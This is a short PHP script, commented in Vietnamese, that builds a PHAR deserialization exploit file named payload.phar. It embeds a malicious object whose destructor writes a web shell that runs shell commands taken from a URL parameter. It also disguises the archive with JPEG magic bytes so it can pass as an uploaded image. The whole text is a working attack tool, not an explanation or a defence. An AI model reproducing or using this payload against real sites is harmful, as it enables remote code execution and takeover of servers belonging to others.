<?php
// make_phar.php - chỉ tạo payload.phar

class Evil {
    function __destruct() {
        file_put_contents('shell.php', '<?php system($_GET["cmd"]); ?>');
    }
}

@unlink("payload.phar");
$phar = new Phar("payload.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "text");
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// nhúng object độc hại vào metadata
$object = new Evil();
$phar->setMetadata($object);
$phar->stopBuffering();

echo "payload.phar created!\n";
